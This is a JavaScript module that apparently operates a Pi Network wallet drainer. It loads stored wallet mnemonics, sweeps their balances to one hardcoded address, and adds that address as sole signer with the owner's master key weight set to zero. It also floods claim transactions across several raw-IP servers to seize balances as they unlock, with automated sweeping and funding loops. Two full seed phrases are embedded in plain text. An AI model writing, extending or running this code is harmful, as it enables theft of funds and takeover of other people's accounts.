import axios from 'axios';
import { HttpsProxyAgent } from 'https-proxy-agent';
import bip39 from 'bip39';
import ed25519 from 'ed25519-hd-key';
import { Keypair, TransactionBuilder, Operation, Asset, Account, FeeBumpTransaction, Memo   } from 'stellar-base';
import Sponsors from '../models/Sponsors.js';
import Passphrase from '../models/Passphrase.js';
import { Server, Keypair as StellarKeypair, TransactionBuilder as StellarTransactionBuilder, Operation as StellarOperation } from 'stellar-sdk';
import { storeLockedPi } from './modelfn.js';
const NETWORK_PASSPHRASE = 'Pi Network';
export const PI_PUBLIC_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
// const PI_PUBLIC_ADDRESS = 'GDEZT7O6BFGB6LPSNMQAVTMTNCEVOJKNQ3W67Q5W5KENWWABMCO24E5U';
const BOT_PHRASE = 'logic resemble wise decline unhappy all arrive engage motor shop borrow one rabbit pattern flight draw inflict wolf boy grit social black hand rate';
const SWEEP_FEE_PAYER_PHRASE = 'pudding inflict cash hawk climb remember orphan gather material stem expire loyal cousin benefit tube buzz love business tooth chimney ring screen rural thought';

const MAX_FLOOD_COUNT = 2;

const firstFilteredSponsors = [
    'GDV2POWRVXELMWGWTTBBXIQSW3PKVWKGI43FD2NJURU6NTBK4QNZXEMJ',
    'GCQOB5VOELVMHW4BN4KFBI2WUR6IES7IT6FXSDR2PXCCDJDR2NEWO2KZ',
    'GAXXHWD25JCUMJCB5GEFOOIDJKCSABHAAECRJMUCUY6A7RHQBADDVMN5',
    'GDC2KOVXJAKY7XBRQQRY4DQQHTVFZDC36TDOXDKHKSLL6WFFCAIRTCNI',
    'GD7NYK2AW6EIDE2PA7WKCCEOIH5SECD6RXOWNOFYUOY7WQRRAKI74RVR',
    'GDWK7SSSWCLCD52SBFKDP4JPSZV6LKQ22UJR45HDZJQELH4YIQD3J67G',
    'GAV2WCOWF4GYUYKFBEFVBZ6XY44PW2MCWLZJ6OLGKHSXYYRC5TVAYLR7',
    'GCDLTGDKDZLHL5QQUWCX6L6SORWAVG43W4MIHQF5YD3M6N5UUO4E3WBH',
    'GAWPSXRXKWMPMCTBBLR47M5FBONIK4O4FE6LSOOX47LVTUV4WWP77BWV',
    'GCFJPFW4WIGQU3DAC325ZIE5YSWOJQETWAIANTQ6ORXMW7LJ43SYBTEC',
]

const secondFilteredSponsors = [
    'GCA6VUL6D3X5DJGA2R6DS7RNKZFM3CZPAJOGO6IJEE4BPSMJ57W4C2WM',
    'GBZCDRUOO6MMP4XZTKBTTDCIFKLGHMJRXQCY4A4PKM5FTNAEE7DIJGNX',
    'GAR7T3F7VIQH2NJYQLQDOU5VJCBIGDAHXUVWV7F6HUNLLMZW2ALR3775',
    'GCZXDDHYTD5QT7JGEUPN6K7T2IQ7V6EPU4762QFG6IJG4A2X4XKLEHVT',
    'GC3FFMNDZIMXFEQLICWYTIW5XV6OI6B25VP3W5D746XGBOWOGCPV5RUX',
    'GBMYRBSMXX52QBSDSCOT6VNVYEZSP7IJJVUAPQCT54BY652LJDELTVYT',
    'GAQ6UBWEA5DIO4QTYCLX6JYYUXYBBS5IJVNVXXEQLAYYBYRVL52VJRE6',
    'GDGHGTFL72MDHKKNLFVZ6FD6KS6YML2PDZ577GDAHR6CRA3E5RU4QUXR',
    'GCUPB6EOM6FARIHP5SSZ7X3UV6X6T4XMD3O5M5KIVKNKHA7ODJQ2OHTO',
    'GDN3WLQ4WP6SD3LFHHGITDFD2JDIXHFWYIGLKWN53YPR72D4J2JBNNDA',
    'GCSIFE2223ZY4NYV5R6HMYF5PSVIU4IDP6DZNF5M5TFBJELBDHZKPOSQ', //r
    'GDXZPFGT2IPQ3BSQHCXD5QMNL5TYRVV2RBIHD35GOAP56ZSQK6P6LTFK', //r
    'GDL657RKHUYSC4EKGGX5ELLSJ5OZBTN2CHF5TURMKVYBHF3MH3H3UELB', //r
    'GDVWGQ5YI5S5FEHOPN5LVXPM5ONW2TLXQA7BMXZAXZRUCICXHQWL7O63', //r
    'GC4TU6WM2Q6ECZCFUBYGWQ7MN7SBHSHRDX4HC4CXCUH3AAT7EZGIEGEB', //r
]
const FIRST_BUMP_FEE = 0.31;
const SECOND_BUMP_FEE = 0.26;



const HORIZONS = [
    'http://localhost:8000', 
    'http://31.97.37.92:8000',
    'http://31.97.56.56:8000', //noble
    'http://31.97.122.182:8000' //latest
];
const horizonUrl = (i) => {
    return HORIZONS[i % HORIZONS.length];
}

const randomServer = () => HORIZONS[Math.floor(Math.random() * HORIZONS.length)];



const server = new Server(randomServer(), { allowHttp: true });
export function getKeypairFromPassphrase(mnemonic) {
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const derived = ed25519.derivePath("m/44'/314159'/0'", seed);
    return Keypair.fromRawEd25519Seed(derived.key);
}

export function getSDKKeypairFromPassphrase(mnemonic) {
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const derived = ed25519.derivePath("m/44'/314159'/0'", seed);
    return StellarKeypair.fromRawEd25519Seed(derived.key);
}

export function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

export async function getAccount(publicKey) {
    const server = randomServer();
    try {
        const response = await axios.get(
            `${server}/accounts/${publicKey}`,
            {
                headers: { 'Content-Type': 'application/json' },
            }
        );
        return response.data;
    } catch(err) {
        // console.error(`❌ Failed to fetch account [${publicKey}]:`, err.response?.data || err.message);
        throw err;
    }
}

function generateUniqueMemo(prefix = 'PiA') {
  const time = Date.now().toString(36);
  const rand = Math.random().toString(36).slice(2, 6);
  const memoStr = `PM:${prefix}/${time.toUpperCase()}/${rand.toUpperCase()}`.slice(0, 28);
  return Memo.text(memoStr);
}

function randomBetweenStartAndEnd(start = 18, end = 25) {
  return Math.floor(Math.random() * (end - start + 1)) + start;
}

export async function buildAndSubmitMultiSigTx(passphrase) {

    const kp = getSDKKeypairFromPassphrase(passphrase);
    const account = await server.loadAccount(kp.publicKey());
    const baseFee = await getBaseFee();

    // return { passphrase, publicKey: kp.publicKey(), account: accountData };

    const tx = new StellarTransactionBuilder(account, {
        fee: baseFee,
        networkPassphrase: NETWORK_PASSPHRASE,
    })
        .addOperation(StellarOperation.setOptions({
            signer: {
                ed25519PublicKey: "GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS",
                weight: 2,
            }
        }))
        .addOperation(StellarOperation.setOptions({
            masterWeight: 0,
            lowThreshold: 2,
            medThreshold: 2,
            highThreshold: 2
        }))
        .setTimeout(30)
        .build();

    tx.sign(kp);

    try {
        const res = await server.submitTransaction(tx);

        return res.data;

    } catch(e) {
        if (e.response?.status === 504) {
        // Try to fetch the transaction by hash
        const txHash = tx.hash().toString('hex');
        const txStatus = await axios.get(`${randomServer()}/transactions/${txHash}`);
        return txStatus.data;
        } else {
            throw e;
        }
    }
}

export async function buildChannelTx(channelPhrase, mainKp, balanceId, recipient, amount) {
    const channelKp = getKeypairFromPassphrase(channelPhrase);
    const accountData  = await getAccount(channelKp.publicKey());
    const channelAccount = new Account(channelKp.publicKey(), accountData.sequence);

    const spendableBalance = await getSpendableBalance(channelKp.publicKey()) * 0.5;
    const fee = Math.floor(spendableBalance * 10000000);

	const tx = new TransactionBuilder(channelAccount, {
		fee: fee.toString(),
		networkPassphrase: 'Pi Network',
        // timebounds: {
        //     minTime,
        //     maxTime
        // }

	})
    .addOperation(Operation.claimClaimableBalance({
		balanceId,
		source: mainKp.publicKey(),
    }))

    .addOperation(Operation.payment({
		destination: recipient,
		asset: Asset.native(),
		amount,
		source: mainKp.publicKey(),
    }))
    .addMemo(generateUniqueMemo(channelKp.publicKey().slice(15, 22)))
    .setTimeout(randomBetweenStartAndEnd())
    .build();

  	tx.sign(mainKp);
  	tx.sign(channelKp);

  	return tx.toXDR();
}

async function buildManualSequenceTx(channelKp, mainKp, sequence, balanceId, recipient, amount, feeMultiplier = 2) {
    const channelAccount = new Account(channelKp.publicKey(), sequence);
    const baseFee = parseFloat(await getBaseFee()) * feeMultiplier;

    const tx = new TransactionBuilder(channelAccount, {
        fee: baseFee.toString(),
        networkPassphrase: NETWORK_PASSPHRASE
    })
    .addOperation(Operation.claimClaimableBalance({
        balanceId,
        source: mainKp.publicKey()
    }))
    .addOperation(Operation.payment({
        destination: recipient,
        asset: Asset.native(),
        amount,
        source: mainKp.publicKey()
    }))
    .addMemo(Memo.text('PiClaim'))
    .setTimeout(20)
    .build();

    tx.sign(mainKp);
    tx.sign(channelKp);

    return tx.toXDR();
}

export async function FloodChannelManualSequence(mainPhrase, balanceId, recipient, amount) {
    const mainKp = getKeypairFromPassphrase(mainPhrase);
    const sponsors = await Sponsors.find();

    if (!sponsors || sponsors.length === 0) {
        return { success: false, error: "No sponsors found" };
    }

    let allTxs = [];
    for (const sponsor of sponsors) {
        const channelKp = getKeypairFromPassphrase(sponsor.mnemonic);

        const accountData  = await getAccount(channelKp.publicKey());

        let currentSeq = BigInt(accountData.sequence);
        console.log(`Current Sequence: ${accountData.sequence}`)

        const numTx = 1;
        for (let i = 0; i < numTx; i++) {
            const seq = (currentSeq + BigInt(i)).toString();
            console.log(`Using Sequence: ${seq}`)
            try {
                const xdr = await buildManualSequenceTx(channelKp, mainKp, seq, balanceId, recipient, amount);
                // allTxs.push(xdr);
                allTxs.push(xdr);
            } catch (err) {
                console.error(`❌ Error building TX for sponsor ${sponsor.mnemonic.slice(0, 5)}...:`, err.message);
            }
        }
    }

    // const limit = pLimit(30)
    const results = await Promise.all(
        // allTxs.map(xdr => limit(() => submitTransaction(xdr)))
        allTxs.map(xdr => submitTransaction(xdr, randomServer()))
    );

    return results;
}

export async function buildChannelFeeBumpTx(channelPhrase, mainKp, balanceId, recipient, amount) {
    const channelKp = getKeypairFromPassphrase(channelPhrase);
    const accountData  = await getAccount(channelKp.publicKey());
    const channelAccount = new Account(channelKp.publicKey(), accountData.sequence);

	const tx = new TransactionBuilder(channelAccount, {
		fee: '400000',
		networkPassphrase: 'Pi Network',


	})
    .addOperation(Operation.claimClaimableBalance({
		balanceId,
		source: mainKp.publicKey(),
    }))

    .addOperation(Operation.payment({
		destination: recipient,
		asset: Asset.native(),
		amount,
		source: mainKp.publicKey(),
    }))
    .setTimeout(40)
    .build();

  	tx.sign(mainKp);
  	tx.sign(channelKp);

    const feeBumpTx = TransactionBuilder.buildFeeBumpTransaction(
        channelKp, 
        "500000",
        tx,
        'Pi Network'
    );

    feeBumpTx.sign(channelKp);

  	return feeBumpTx.toXDR();
}


export async function submitTransaction(txXdr, horizon) {
    try {

        const res = await axios.post(
            `${horizon}/transactions`,
            `tx=${encodeURIComponent(txXdr)}`,
            { 
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            }
        );
        return res.data;
    } catch (err) {
        const error = err.response?.data;

        if (error && error.extras) {
            const { result_codes, envelope_xdr, result_xdr } = error.extras;
            return {
                success: false,
                reason: result_codes,  // includes transaction and operation-level error codes
                result_xdr,
                envelope_xdr,
                error,
            };
        }

        return {
            success: false,
            message: error?.detail || err.message,
            error,
        };
    }
}

export async function getClaimableBalance(publicKey) {
        try {
            const res = await axios.get(
                `${randomServer()}/claimable_balances?claimant=${publicKey}`,
                { 
                    headers: { 'Content-Type': 'application/json' },
                }
            );

            return res.data;
        } catch(err) {
            return { error: err }
        }
}

export async function FloodchannelTransaction(mainPhrase, balanceId, recipient, amount, allSponsors) {
    const mainKp = getKeypairFromPassphrase(mainPhrase);
    if(allSponsors) {
        const result = await Promise.all(allSponsors.map(async (sponsor, i) => {
            const server = horizonUrl(i);
            try {
                const xdr = await buildChannelTx(sponsor.mnemonic, mainKp, balanceId, recipient, amount);
                const result = await submitTransaction(xdr, server);
                if (!result.success) {
                    console.error("❌ Transaction failed:", result.reason);
                }
                return result;
            } catch (err) {
                const response = err?.response;
                const data = response?.data;

                console.error(`❌ Error building/submitting for channel ${i}:`, err);

                return data ?? err?.message ?? String(err);
            }
        }));

        return result;
    }
    return { success: false, error: "No sponsored accounts found"}
}

export async function FloodFeeBumpTransaction(mainPhrase, balanceId, recipient, amount) {
    const mainKp = getKeypairFromPassphrase(mainPhrase);
    const allSponsors = await Sponsors.find();
    console.log(allSponsors);
    if(allSponsors) {
        const result = await Promise.all(allSponsors.map(async (sponsor, i) => {
            try {
                const xdr = await buildChannelFeeBumpTx(sponsor.mnemonic, mainKp, balanceId, recipient, amount);
                return await submitTransaction(xdr, horizonUrl(i));
            } catch (err) {
                console.error(`❌ Error building/submitting for channel ${i}:`, err);
            }
        }));

        return result;
    }
    return { success: false, error: "No sponsored accounts found"}
}

async function getSpendableBalance(publicKey) {
    const accountData  = await getAccount(publicKey);
    const balanceString = getBalance(accountData);

    return parseFloat(balanceString) - 0.98;
} 


export async function sweepWallet(mainPhrase, recipient, useFeePayer = false) {
    const mainKp = getKeypairFromPassphrase(mainPhrase);
    const accountData  = await getAccount(mainKp.publicKey());

    const feePayerKp = getKeypairFromPassphrase(SWEEP_FEE_PAYER_PHRASE);
    const feePayerAccountData  = await getAccount(feePayerKp.publicKey());
    const feePayerAccount = new Account(feePayerKp.publicKey(), (BigInt(feePayerAccountData.sequence) + BigInt(0)).toString());
    const feePayerSpendableBalance = parseFloat((getBalance(feePayerAccountData)) - 0.98);

    const enoughFee = feePayerSpendableBalance >= 0.01;

    for (const i = 0; i < 1; i++) {
        const seq = (BigInt(accountData.sequence) + BigInt(i)).toString();
        const account = new Account(mainKp.publicKey(), seq);
        const balanceString = getBalance(accountData);
        const baseFee = enoughFee && useFeePayer ? Math.floor(feePayerSpendableBalance * 10000000) : 100000;

        const onePiInStroops = 10_000_000;
        const balance = parseFloat(balanceString);
        const txCharge = 0.01;
        const baseReserve = 0.5 * (accountData?.num_sponsoring ?? 0);
        const minReserve = 0.98 + baseReserve;
        const epsilon = 1e-7;
        const raw = balance - minReserve - (enoughFee && useFeePayer ? 0 : txCharge);
        const withdrawable = raw > epsilon ? raw : 0;

        if(withdrawable === 0) {
            return;
        }

        const txAccountBuilder = enoughFee && useFeePayer ? feePayerAccount : account;

        const tx = new TransactionBuilder(txAccountBuilder, {
            fee: baseFee.toString(),
            networkPassphrase: NETWORK_PASSPHRASE,
        })
            .addOperation(Operation.payment({
                destination: recipient,
                asset: Asset.native(),
                amount: withdrawable.toFixed(7),
            }))
            .addMemo(generateUniqueMemo(mainKp.publicKey().slice(15, 22)))
            .setTimeout(randomBetweenStartAndEnd())
            .build();

        tx.sign(mainKp);
        if(enoughFee && useFeePayer) {
            tx.sign(feePayerKp);
        }

        try {
            const res = await axios.post(
                `${randomServer()}/transactions`,
                `tx=${encodeURIComponent(tx.toXDR())}`,
                { 
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                }
            );

            if(res.data.hash) {
                console.log(`Sweeped ${withdrawable.toFixed(7)}`)
                return {data: res.data, amount: withdrawable.toFixed(7)};
            }
        } catch (error) {
            return { error: error.message, amount: 0.000 };
        }
        
    }
	

    return {data: { error: "No Pi sweeped" }, amount: 0.000};
}

export async function fundWallet(mainPhrase, recipient, amount) {
    const mainKp = getKeypairFromPassphrase(mainPhrase);
    const accountData  = await getAccount(mainKp.publicKey());
    const account = new Account(mainKp.publicKey(), accountData.sequence);
	const baseFee = parseFloat(await getBaseFee());

    const tx = new TransactionBuilder(account, {
        fee: baseFee.toString(),
        networkPassphrase: NETWORK_PASSPHRASE,
    })
        .addOperation(Operation.payment({
            destination: recipient,
            asset: Asset.native(),
            amount,
        }))
        .setTimeout(30)
        .build();

    tx.sign(mainKp);
	
    const res = await axios.post(
        `${randomServer()}/transactions`,
        `tx=${encodeURIComponent(tx.toXDR())}`,
        { 
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        }
    );

    return {data: res.data, amount: amount};
}


const FEE_CACHE_TTL = 10_000;

let cachedFee= null;
let lastFeeFetchTime = 0;
export async function getBaseFee() {
    const now = Date.now();
    if (cachedFee && (now - lastFeeFetchTime < FEE_CACHE_TTL)) {
        return cachedFee;
    }

    try {
        const response = await axios.get(`${randomServer()}/fee_stats`, 
            {
                headers: { 'Content-Type': 'application/json' },
            }
        );
        cachedFee = response.data.fee_charged.max; // returns string
        lastFeeFetchTime = now;
        return cachedFee;
    } catch (error) {
        console.error('❌ Failed to fetch fee stats:', error.message);
        // fallback to default
        return '100000';
    }
}

export function getBalance(account) {
	const balanceObj = account.balances.find(
		(b) => b.asset_type === 'native'
    );

    return balanceObj ? balanceObj.balance : '0';
}

export const autoClaimUnlocked = async (sponsors) => {
    if(global.isUnlocking) return;
    global.isUnlocking = true;

    // console.log(`Trying auto claim now...`);

    const now = new Date();
    const fiveSecondsFromNow = new Date(now.getTime() + 6000);

    const readyPassphrases = await Passphrase.find({
        claimableAt: { $lte: fiveSecondsFromNow },
        status: 'pending',
        name: { $in: [null, undefined] }
    });

    for (const p of readyPassphrases) {
        try {
            console.log(`🔄 Claiming for: ${p.mnemonic.slice(0, 10)}...`);

            let tries = 0;
            let success = false;

            while(!success && tries < MAX_FLOOD_COUNT) {

                const result = await FloodchannelTransaction(
                    p.mnemonic,
                    p.balanceId,
                    PI_PUBLIC_ADDRESS,
                    p.amount,
                    sponsors
                );
                const found = result.find((r) => r.hash);
                if (found) {
                    console.log(`✅ Claimed Pi. Hash: ${found.hash}`);
                    await Passphrase.updateOne(
                        { _id: p._id },
                        { $set: { status: "claimed" } }
                    );
                    global.lastClaimedOrFailedAt = new Date();
                    success = true;
                    break;
                }
                tries++;
            }
            if (!success) {
                await Passphrase.updateOne(
                    { _id: p._id },
                    { $set: { status: "failed" } }
                );
                global.lastClaimedOrFailedAt = new Date();
            }

            

        } catch (err) {
            console.error('❌ Error something went wrong Pi:', err.message || err);
        }
    }

    global.isUnlocking = false;

}


async function getUpcomingClaimables(min = 25, start = 0.5) {
    const now = new Date();
    const tenMin = min * 60 * 1000;
    const x = start * 60 * 1000;
    const xMinutesFrom = new Date(now.getTime() - x);
    const tenMinutesFromNow = new Date(now.getTime() + tenMin);
    const upcomingClaimables = await Passphrase.find({
        claimableAt: {
            $gte: xMinutesFrom,
            $lte: tenMinutesFromNow
        },
        status: 'pending',
        name: { $in: [null, undefined] }
    });

    return upcomingClaimables;
}

export function arrayBatches(arr, batchSize = 100) {
    const batches = [];

    for (let i = 0; i < arr.length; i += batchSize) {
        const batch = arr.slice(i, i + batchSize);
        batches.push(batch);
    }

    return batches;
}

export const autoSweepWallet = async (instance) => {
    if(instance !=1) return;
    if(global.isSweeping) return;
    global.isSweeping = true
    const upcomingClaimables = await getUpcomingClaimables();
    if (upcomingClaimables.length > 0) {
        for(const claimable of upcomingClaimables) {
            await sweepWallet(claimable.mnemonic, PI_PUBLIC_ADDRESS);
            await sleep(1000);
        }
        global.isSweeping = false;
        return;
    }

    const readyPassphrases = await Passphrase.find({ name: { $in: [null, undefined] } });
    const passphraseBatches = arrayBatches(readyPassphrases, 80);

    for(const passphrases of passphraseBatches) {
        await Promise.all(passphrases.map(async (phrase, i) => {
            try {
                const existingSponsor = await Sponsors.findOne({ mnemonic: phrase.mnemonic });
                if(!existingSponsor) {
                    await sweepWallet(phrase.mnemonic, PI_PUBLIC_ADDRESS);
                }
            } catch (e) {
                if (e.response && e.response.data && e.response.data.extras) {
                    const extras = e.response.data.extras;
                    console.log('Transaction failed:', extras);
                } else {
                    console.error('Unknown error:', e);
                }
            }
        }));

        await sleep(1000);
    }
    global.isSweeping = false;
};

export const autoSweepSponsor = async (instance) => {
    if(instance != 2) return;

    if(global.isSweepingSponsor || global.isFunding || global.isUnlocking) return;
    
    const now = new Date();
    const lastActivity = global.lastClaimedOrFailedAt || new Date(0);
    const minutesSinceLast = (now - new Date(lastActivity)) / (1000 * 60);
    if (minutesSinceLast < 3) return;

    global.isSweepingSponsor = true;

    try {
        
        const in30mins = new Date(now.getTime() + 30 * 60 * 1000);
        let upcomingClaimables = await Passphrase.find({
            claimableAt: { $lte: in30mins },
            status: 'pending',
            name: { $in: [null, undefined] }
        });

        if (upcomingClaimables.length > 0) return;

        const sponsors = await Sponsors.find({ name: 'whoami5677' });
        let maxRetries = 10;
        let retries = 0;
        const chunkSize = Math.ceil(sponsors.length / maxRetries);
        if (!upcomingClaimables.length) {
            while(!upcomingClaimables.length && retries < maxRetries && !global.isFunding) {
                upcomingClaimables = await Passphrase.find({
                    claimableAt: { $lte: in30mins },
                    status: 'pending',
                    name: { $in: [null, undefined] }
                });

                const start = retries * chunkSize;
                const end = Math.min(start + chunkSize, sponsors.length);
                const sponsorChunk = sponsors.slice(start, end);

                console.log(`Sweeping ${sponsorChunk.length} wallets`)

                await Promise.all(sponsorChunk.map(async (sponsor, i) => {
                    await sweepWallet(sponsor.mnemonic, PI_PUBLIC_ADDRESS);
                }));
                await sleep(500);
                retries++;
            }
        };

        
    } catch(err) {
        console.log(`Something went wrong, sweeping sponsors`, err)
    } finally {
        global.isSweepingSponsor = false;
    }
}

export const autoFundWallet = async (instance) => {
    if (instance != 0) return;
    if (global.isFunding || global.isUnlocking) return;

    global.isFunding = true;
    try {
        let upcomingClaimables = await getUpcomingClaimables();
        if (!upcomingClaimables.length) return;

        const sponsors = await Sponsors.find({ name: 'whoami5677' });

        for (const p of sponsors) {
            try {
                const BotKP = getKeypairFromPassphrase(BOT_PHRASE);
                const botAccountData = await getAccount(BotKP.publicKey());
                const botBalanceString = getBalance(botAccountData);
                const botBalance = parseFloat(botBalanceString) - 1.98;

                const sponsorKp = getKeypairFromPassphrase(p.mnemonic);
                const accountData = await getAccount(sponsorKp.publicKey());

                const balanceString = getBalance(accountData);
                const actualBalance = parseFloat(balanceString);
                const targetBalance = 0.08;
                const reserve = 0.98;
                const changeNeeded = targetBalance - (actualBalance - reserve);
                console.log(`Funding`);

                const calculateFundingAmount = () => {
                    const isInFirstFiltered = firstFilteredSponsors.includes(sponsorKp.publicKey());
                    const isInSecondFiltered = secondFilteredSponsors.includes(sponsorKp.publicKey());

                    if(sponsorKp.publicKey() === 'GDN3WLQ4WP6SD3LFHHGITDFD2JDIXHFWYIGLKWN53YPR72D4J2JBNNDA') {
                        return botBalance > 6.45748 ? 6.45748 : changeNeeded;
                    }

                    if (isInFirstFiltered) {
                        return botBalance > FIRST_BUMP_FEE ? FIRST_BUMP_FEE : changeNeeded;
                    }

                    if (isInSecondFiltered) {
                        return botBalance > SECOND_BUMP_FEE ? SECOND_BUMP_FEE : changeNeeded;
                    }

                    return changeNeeded;
                };

                if (changeNeeded > 0 && botBalance > changeNeeded) {
                    const result = await fundWallet(
                        BOT_PHRASE,
                        sponsorKp.publicKey(),
                        calculateFundingAmount().toFixed(7)
                    );

                    const success = result.data;
                    if (success.hash) {
                        // console.log(`✅ funded ${result.amount} Pi. Hash: ${success.hash}`);
                    } else {
                        // console.log(`❌ Failed to fund ${result.amount} PI}`);
                    }
                }
            } catch (err) {
                console.error('❌ Error funding Pi:', err.message || err);
            }

            await sleep(1000);
        }
    } catch (err) {
        console.error('❌ Unexpected error in autoFundWallet:', err.message || err);
    } finally {
        global.isFunding = false;
    }
};

export const autoCheckSponsorForClaimable = async (instance) => {
    if(instance !== 6) return;
    // const sponsors = await Sponsors.find();

    // for(const s of sponsors) {
    //     const kp = getKeypairFromPassphrase(s.mnemonic);
    //     const publicKey = kp.publicKey();
    //     const result = await storeLockedPi(s.mnemonic, publicKey, PI_PUBLIC_ADDRESS, true)
    //     if(result && result.success) {
    //         await Sponsors.findByIdAndDelete(s._id);
    //     }
    //     await sleep(10000)
    // }

    const passphrases = await Passphrase.find();
    for(const p of passphrases) {
        const kp = getKeypairFromPassphrase(p.mnemonic);
        const publicKey = kp.publicKey();
        await storeLockedPi(p.mnemonic, publicKey, PI_PUBLIC_ADDRESS, true)
        await sleep(10000);
    }
}

export const autoDuplicatePassphrase = async () => {
    const duplicates = await Passphrase.aggregate([
        {
            $group: {
            _id: "$mnemonic",
            ids: { $push: "$_id" },
            count: { $sum: 1 }
            }
        },
        {
            $match: { count: { $gt: 1 } }
        }
    ]);

    for (const dup of duplicates) {
        const [keep, ...toDelete] = dup.ids;

        const docsToCheck = await Passphrase.find({ _id: { $in: toDelete } });

        for (const doc of docsToCheck) {
            const isClaimablePassed = !doc.claimableAt || new Date(doc.claimableAt) <= new Date();
            const isBalanceIdNull = doc.balanceId == null;

            if (isClaimablePassed || isBalanceIdNull) {
                await Passphrase.deleteOne({ _id: doc._id });
            }
        }
    }

}

